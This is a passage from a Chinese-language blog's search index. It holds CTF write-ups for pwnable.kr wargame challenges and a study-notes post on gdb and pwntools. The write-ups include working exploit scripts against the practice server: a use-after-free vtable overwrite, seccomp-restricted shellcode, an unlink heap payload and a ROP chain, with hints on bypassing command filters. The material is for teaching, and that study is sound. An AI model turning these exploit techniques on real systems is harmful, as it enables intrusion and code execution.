&lt;main+140&gt; 0x00008d98 &lt;+92&gt;: bl 0x1050c &lt;puts&gt; 0x00008d9c &lt;+96&gt;: ldr r0, [pc, #40] ; 0x8dcc &lt;main+144&gt; 0x00008da0 &lt;+100&gt;: bl 0xf89c &lt;system&gt; 0x00008da4 &lt;+104&gt;: b 0x8db0 &lt;main+116&gt; 0x00008da8 &lt;+108&gt;: ldr r0, [pc, #32] ; 0x8dd0 &lt;main+148&gt; 0x00008dac &lt;+112&gt;: bl 0x1050c &lt;puts&gt; 0x00008db0 &lt;+116&gt;: mov r3, #0 0x00008db4 &lt;+120&gt;: mov r0, r3 0x00008db8 &lt;+124&gt;: sub sp, r11, #8 0x00008dbc &lt;+128&gt;: pop &#123;r4, r11, pc&#125; 0x00008dc0 &lt;+132&gt;: andeq r10, r6, r12, lsl #9 0x00008dc4 &lt;+136&gt;: andeq r10, r6, r12, lsr #9 0x00008dc8 &lt;+140&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0 0x00008dcc &lt;+144&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc 0x00008dd0 &lt;+148&gt;: andeq r10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) 易得题意为计算key1,key2,key3的值，然后输入他们的和即可。学习知识参考以下两个链接：arm速成 跳转指令基本用法 mistake思路：1. 有源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; printf("do not bruteforce...\n"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf("read error\n"); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf("input password : "); scanf("%10s", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf("Password OK\n"); system("/bin/cat flag\n"); &#125; else&#123; printf("Wrong Password\n"); &#125; close(fd); return 0;&#125; 额，这题比较坑，要不是有hint也不知道能不能做出来。。。。。有hint就很简单了。。。。不说了吧 shellshock思路：1. 有源码： 1234567#include &lt;stdio.h&gt;int main()&#123; setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system("/home/shellshock/bash -c 'echo shock_me'"); return 0;&#125; 根据提示和源码较为简单，猜是一道知识题 shellshock知识参考 需要注意的一点是执行cat flag时要改成 /bin/cat flag 因为sh的环境变量中未必有/bin，所以cat命令不一定能找到，最好用绝对路径。 coin1(借鉴别人的，不想写了。。)exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152# coding: utf-8import socketimport randomimport timeimport reimport string def getweight(start, end): str_ask = [str(n) for n in range(start, end)] str_ask = " ".join(str_ask) client.send(bytes(str_ask+"\n")) str_weight = client.recv(10) str(str_weight).split("\n") weight = int(str_weight) return weight HOST = ('0.0.0.0')PORT = 9007client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) client.connect((HOST, PORT))data = client.recv(1024)time.sleep(4)for i in range(100): recv_data = str(client.recv(2048)) position_of_number = (recv_data.find('N=')) position_of_chance = (recv_data.find('C=')) # print(position_of_number) # print(position_of_chance) number = 0 chance = 0 for k in range(10): if str(recv_data[position_of_number + 2 + k]) &lt;= '9' and str(recv_data[position_of_number + 2 + k]) &gt;= '0': number = int(recv_data[position_of_number + 2 + k]) + number * 10 k += 1 else: break for k in range(100): if str(recv_data[position_of_chance + 2 + k]) &lt;= '9' and str(recv_data[position_of_chance + 2 + k]) &gt;= '0': chance = int(recv_data[position_of_chance + 2 + k]) + chance * 10 k += 1 else: break start = 0 end = number middle = int((start+end) / 2) for p in range(chance): weight=getweight(start, middle) if (middle - start) * 10 == weight: start = middle # print("start:",start) middle = int((middle + end) / 2) # print("middle:",middle) else: end = middle #print("start:", start) middle = int((start + middle) / 2) #print("middle:", middle) if (middle == start): print(end) client.send(bytes(str(start) + "\n"))s = client.recv(1024)print(s)#就是在这里昨天多加了一个enter，从而导致后面接收的数据有误(得加红加粗纪念一下）#client.send(bytes("\n", encoding="utf-8"))（垃圾代码毁我青春）s2=client.recv(1024)print(s2) blackjack思路：额，这题不想说啥，800多行代码其实就一小部分有用，就是考耐心与阅读速度，根据提示下赌注，成为百万富翁，然后就有flag了。 lotto思路：这题和上题一样也是脑洞一点的题，需要一点知识储备，就是ascii码表33号以后才为可见字符，范围大大缩小，等于在33~45的字符里随便选一个有 6/(45-33) 的概率获得flag。试几次就有了。。 cmd1思路：使参数通过滤器，利用字符串补齐功能即可。 cmd2思路：分析源代码可知是加强的过滤，需要你去了解环境变量PATH的作用和意义，extern 从外界导入变量，并且用一个函数将环境变量清空，代表所有的命令都必须是绝对路径。不能用‘/’是最操蛋的事，所以必须在根目录里用$(pwd)来显示‘ /‘，$(命令)的意义是将命令在sh里输入时的输出结果原封不动的换在$()的位置。 uaf思路： 1. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt; #include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system("/bin/sh"); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; "My name is " &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; "I am " &lt;&lt; age &lt;&lt; " years old" &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a nice guy!" &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public: Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a cute girl!" &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man("Jack", 25); Human* w = new Woman("Jill", 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; "1. use\n2. after\n3. free\n"; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; "your data is allocated" &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0; &#125; 从这题开始就有点难度了，开始向读者介绍一些基本的pwn的方法，并且需要学很多新的知识，有知识才能解题，经过一番查阅后得知uaf为use after free/delete，即先malloc()一段空间后，free/delete后指向其的指针却没有NULL，从而继续申请一块大小相似的malloc()后（数据精心设计），这个指针将指向他，可以通过操纵这个指针来操纵这块被设计的数据空间，进而pwn。 大致思路分三步：一是先找到原来MAN申请的内存大小，作为第二个参数，二是找到虚函数表的地址，在ida里就可以解决，三是创建一个文件将修改的数据放进去(我创建文件创建不了，不知道为啥，只能从标准输入输入了)。 exp：（看别人的exp学到一个新技能，/dev/stdin） 1234567891011121314from pwn import * s=ssh(host='pwnable.kr',user='uaf',port=2222,password='guest')p=s.process(executable='./uaf',argv=['./uaf','24','/dev/stdin'])p.recv(1024)p.sendline('3')p.recv(1024)p.sendline('2')p.send('\x68\x15\x40\x00\x00\x00\x00\x00')p.recv(1024)p.sendline('2')p.send('\x68\x15\x40\x00\x00\x00\x00\x00')p.recv(1024)p.sendline('1')p.interactive() memcpy思路： 1. 有源码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc()&#123; asm("rdtsc");&#125;char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125;char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125;int main(void)&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Hey, I have a boring assignment for CS class.. :(\n"); printf("The assignment is simple.\n"); printf("-----------------------------------------------------\n"); printf("- What is the best implementation of memcpy? -\n"); printf("- 1. implement your own slow/fast version of memcpy -\n"); printf("- 2. compare them with various size of data -\n"); printf("- 3. conclude your experiment and submit report -\n"); printf("-----------------------------------------------------\n"); printf("This time, just help me out with my experiment and get flag\n"); printf("No fancy hacking, I promise :D\n"); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++)&#123; // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf("specify the memcpy amount between %d ~ %d : ", low, high); scanf("%d", &amp;size); if( size &lt; low || size &gt; high )&#123; printf("don't mess with the experiment.\n"); exit(0); &#125; sizes[i++] = size; &#125; sleep(1); printf("ok, lets run the experiment with your configuration\n"); sleep(1); // run experiment for(i=0; i&lt;10; i++)&#123; size = sizes[i]; printf("experiment %d : memcpy with buffer size %d\n", i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1); printf("\n"); &#125; printf("thanks for helping my experiment!\n"); printf("flag : ----- erased in this source code -----\n"); return 0;&#125; 很明显要先学习知识：需要学习setvbuf()，mmap()函数，和c语言内嵌汇编的形式，以及movdqa,movntps命令是干啥的，也就是必须要理解以下这段代码是什么意思，在此分享一篇相当详细的文章 链接 1234567891011while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); 其实这题实际上想考的是堆分配时字节对齐问题。只要保证每次输入的数在他要求的范围内并且顺利运行完程序即可，问题在于movntps和movdqa要求操作的内存地址必须为16字节对齐的，所以dest必须为0x——0，可以在代码中加上一句 printf (“dest: %d\n”, dest) 再运行就观察起来方便很多，每次dest比上次增加的数就是上一次的size+8，自己找规律即可。 asm思路： 1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#define LENGTH 128void sandbox()&#123; scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) &#123; printf("seccomp error\n"); exit(0); &#125; seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) &lt; 0)&#123; seccomp_release(ctx); printf("seccomp error\n"); exit(0); &#125; seccomp_release(ctx);&#125;char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";unsigned char filter[256];int main(int argc, char* argv[])&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Welcome to shellcoding practice challenge.\n"); printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"); printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"); printf("If this does not challenge you. you should play 'asg' challenge :)\n"); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub); printf("give me your x64 shellcode: "); read(0, sh+offset, 1000); alarm(10); chroot("/home/asm_pwn"); // you are in chroot jail. so you can't use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0;&#125; 正如开头所说，第一部分为了帮我们搭一个框架，所以各方面都稍微涉及到，这题的目的是让我们对shellcode有一定的了解，分析代码，发现需要学的东西有沙箱中的seccomp() 参考1 参考2 然后他限制我们只能用open read write exit等 所以基本思路就是用read读flag中的内容，然后用write向标准输出写。然后写exp时需要用shellcraft生成调用函数的汇编代码再用反汇编生成shellcode。学会了一些写exp的新知识。 exp： 1234567891011from pwn import * s=ssh(host='pwnable.kr',user='asm',password='guest',port=2222)p=s.connect_remote('0',9026)context(arch='amd64',os='linux') shellcode=shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_ file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooo oooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooo oooooo000000000000o0o0o0o0o0o0ong')shellcode+=shellcraft.open('rsp',0)shellcode+=shellcraft.read('rax','rsp',1000)shellcode+=shellcraft.write(1,'rsp',1000) p.sendline(asm(shellcode))p.interactive() unlink思路: 1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ&#123; struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];&#125;OBJ;void shell()&#123; system("/bin/sh");&#125;void unlink(OBJ* P)&#123; OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;&#125;int main(int argc, char* argv[])&#123; malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf("here is stack address leak: %p\n", &amp;A); printf("here is heap address leak: %p\n", A); printf("now that you have leaks, get shell!\n"); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;&#125; 这一题算是最基础的模仿unlink的堆的题目，设计的很巧妙，简洁易懂这和初学者入手，先查阅资料得知unlink的基本原理(我看的范例是double free)，理解unlink()函数的意图是解题关键，即B-&gt;fd-&gt;bk=B-&gt;bk B-&gt;bk-&gt;fd=B-&gt;fd 等价为 (**B+4)= （B+4） （B+4）= B 改写B中fd和bk的值理论上可以向任何地址写入任何数据。 开始解题： exp： 注意：recv()接收数据以字符串的形式，例：‘0x456789’占8个字节。print一下即可知道接收了几个字节。 1234567891011121314from pwn import * s=ssh(host='pwnable.kr',user='unlink',password='guest',port=2222)p=s.process('./unlink')sh_addr=0x080484ebp.recvuntil('here is stack address leak: ')stack_addr=p.recv(10)stack_addr=int(stack_addr,16)p.recvuntil('here is heap address leak: ')heap_addr=p.recv(10)heap_addr=int(heap_addr,16)payload=p32(sh_addr) + 'A' * 12 + p32(heap_addr+12) +p32(stack_addr+16)p.send(payload)p.interactive() blukathorcruxes思路：1. 没有源码，只能远程下载（scp -P 2222 horcruxes@pwnable.kr:~/horcruxes Desktop）在放进ida里分析。 题目提示为rop则肯定是利用栈溢出来pwn，所以找gets()成为第一步，发现在ropme()函数里有gets()，所以思路基本确定为改写ropme()的ret，分别打印出ABCDEFG的值，然后算出sum，之后再跳到ropme()函数再执行一次拿到flag。(难点在于写exp…….) 大致步骤为：1.先用ida找到七个函数的地址，记录下来之后 2.看偏移确定payload (操蛋的是sum的范围不能超过int，必须用一个if else结构选择一下) exp1： 12345678910111213141516171819202122232425262728293031from pwn import * s=ssh(host='pwnable.kr',user='horcruxes',password='guest',port=2222)p=s.connect_remote('localhost',9032)horcruxes=[0x0809fe4b,0x0809fe6a,0x0809fe89,0x0809fea8,0x0809fec7,0x0809fee6,0x0809ff05] ropme_addr=0x0809fff9sum=0p.sendlineafter("Select Menu:",'0')p.recvuntil("How many EXP did you earned? : ")payload='a'*0x78for i in range(7): payload+=p32(horcruxes[i])payload+=p32(ropme_addr)p.sendline(payload) for i in range(7): p.recvuntil("EXP +") tmp=p.recvuntil(")",drop=True) log.info(tmp) sum+=int(tmp,10)log.info("raw sum: 0x%x" % sum)if sum&gt;pow(2,31): log.warn('try again') exit(0)elif sum&lt;-pow(2,31): log.warn('try again') exit(0)p.sendlineafter("Select Menu:",'0')p.sendlineafter("How many EXP did you earned? : ",unicode(sum))p.interactive() exp2: 1234567891011121314151617181920212223242526272829303132333435from pwn import *from ctypes import *s=ssh(port=2222,host='pwnable.kr',user='horcruxes',password='guest')HOST = "localhost"PORT = 9032r = s.remote(HOST, PORT)horcruxes = [0x0809FE4B, 0x0809FE6A, 0x0809FE89, 0x0809FEA8, 0x0809FEC7, 0x0809FEE6, 0x0809FF05]main_call_ropme = 0x0809fffc def main () : exp = 0 r.recvuntil("Menu:") r.sendline('1') r.recvuntil(" : ") payload = "A"*116 payload += "B"*4 # SFP for i in range (7) : payload += p32(horcruxes[i]) payload += p32(main_call_ropme) r.sendline(payload) for i in range (7) : r.recvuntil("+") tmp = r.recvuntil(")").replace(")","") log.info(tmp) exp += int(tmp) log.info("exp : " + str(c_int(exp).value)) r.recvuntil("Menu:") r.sendline("1") r.recvuntil(" : ") r.sendline(str(c_int(exp).value)) r.interactive() if __name__ == '__main__' : main() pwnable.kr第一部分到此结束，（以前有一题codemap好像挺不错的，有空可以找来看一下。）也算对这一个多月时间的交代吧，进度已经慢太多，也有不少细节问题没弄懂。。。下一部分计划是跟着ctf-wiki把栈溢出学完，然后去jarvis.oj把栈溢出的七道题做了，然后在跟着ctf-wiki体系学习。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小心得]]></title>
    <url>%2F2018%2F12%2F20%2F%E5%B0%8F%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[解决的题目：kr.unlink 收获与问题： unlink收货： 对chunk结构有了初步了解 （具体） 对指针有了更加具体的概念，-&gt;代表的意义更加清晰，我个人比较喜欢用一层一层来理解指针，地址一层一层指向。以B-&gt;fd-&gt;bk=B-&gt;bk B-&gt;bk-&gt;fd=B-&gt;fd 也就是 (**B+4)= （B+4） （B+4）= B 工具更熟练，gdb了解了info frame()，bt(查看函数栈框信息)，b *addr（在汇编码地址下断点） ，list funcname(查看函数代码)，file docuname(查看文件信息（主要看elf文件有没有加壳和32还是64位)（说到这我elf文件还没开始看QAQ ),s(进入函数),n(不进入函数) gdb调试 一个比较弱智的东西：怎么用gcc把代码在64位系统上编译为32位elf文件。(这是做所有题目的基础，我竟然现在才发觉OTZ) 例：gcc -m32 -o -g unlink unlink.c (需要先安32位的库，网上都有) call(先将地址压栈，后eip进入子函数),leave(mov esp,ebp pop ebp),ret(pop eip) 抄了一遍exp，大致有个印象(暂时没有花时间学，下周任务) asm收货： 读flag方法：有shell以后，cat flag或者从flag读到缓冲区在write到标准输出。（一般在有沙箱时使用） print disasm(“机器码”)。 shellcraft.sh(),shellcraft.pushstr(),shellcraft.write(),shellcraft.read()出来的都是汇编代码，需要再asm一下。 rop收货 栈溢出基本思路：找带有输入漏洞函数（scnaf,gets）的函数(不要觉得main函数特殊),然后再利用偏移控制程序执行流。一找输入漏洞，二确定利用哪一个函数ret，三rop 稍稍复杂的exp怎么写 其他收货： 写blog时git config –global user.name/user.email时总是报错说找不到.gitconfig文件，但是实际上文件就在那里，上网找了好久，好像是.gitconfig目录少了一个.git文件夹 然后我用管理员身份运行它就可以hexo d了 我也不清楚为啥 反正现在主题也选好了，起码可以开始正常写blog了。：）此外，对blog的config文件也更加熟悉。 用ida可以直接看到栈中缓冲区和变量的地址（F5大法），peda的功能更加熟悉(可以直接查看寄存器的值，栈的值，将要执行的指令等)，收货一个pattern.py脚本，可用来算溢出点，但自己看最好。 0xfffffff8(%ebp)=%ebp-0x8 exp基本框架以及pwntools基本用法： pwntools使用简介 pwntools开始使用 一步一步学pwntools 123456789101112131415161718192021from pwn import *//s=ssh(host=&apos;&apos;,user=&apos;&apos;,password=&apos;&apos;,port=)p=s.connect_remote(&apos;服务器名称&apos;,port)/p=s.process(argv=[],executable=&apos;./文件名&apos;)context(arch=&apos;amd64&apos;,os=&apos;linux&apos;,log_level=&apos;debug&apos;)//log_level=&apos;debug&apos;的作用是将recv的内容全都显示在屏幕上。//定义变量p.recv(接收字节数)p.recvuntil(&apos;源代码中字符串&apos;)p.recvline()p.recvall()p.recvrepeat()p.send(发送字节数)p.senduntil(&apos;源代码中字符串&apos;)p.sendline()//shellcode生成：//payload生成:payload=&apos;n&apos;*mpayload+=p32(整数)/p64(整数)p.sendline(payload)p.interactive() send()和sendline()的区别:(已解决。。因为源代码有一个gets()函数,末尾必须加一个换行符已以告知程序输入完毕，所以写exp时用sendline(payload),或者用send(payload + ‘\n’)).. （还没细看）关于一些保护措施(ASRL/PIE, NX/DEP, RELRO, Canary(栈保护))，参考链接 linux程序的常用保护机制 先看寻址方式，再看gdb中偏移量 当看到很多大写字母变量换成数字时，常为宏定义 scanf()函数限制了输入的形式，不能随意控制，其应该是整数溢出的漏洞题型。现阶段能掌握的只有gets()函数。。。。。。（p32打包好像只能用于字符串中的整数，scanf(%d)中的必须自己输入send(‘整数’)，不加’‘代表为字节数。。） recv()的接收数据为字符串，且一位为一个字符。 p.recv(“)”,drop=True) == p.recv(“)”).replace(“)”,””) log为显示在屏幕上 有info warn 等几种标号 log 我觉得可能是网站的问题，前段时间做uaf的时候就觉得很怪，他题目的答案和在我电脑上跑出来的不一样，uaf的vtable地址都不一样，unlink的ABC地址都不一样。 工具还是用的不熟，以及汇编代码看的还是没感觉。还是练得太少 怎么创建一个新文件，以前还会，现在怎么不会了，服了，查了一会没查到，]]></content>
      <tags>
        <tag>pwn基础</tag>
        <tag>小心得</tag>
      </tags>
  </entry>
</search>
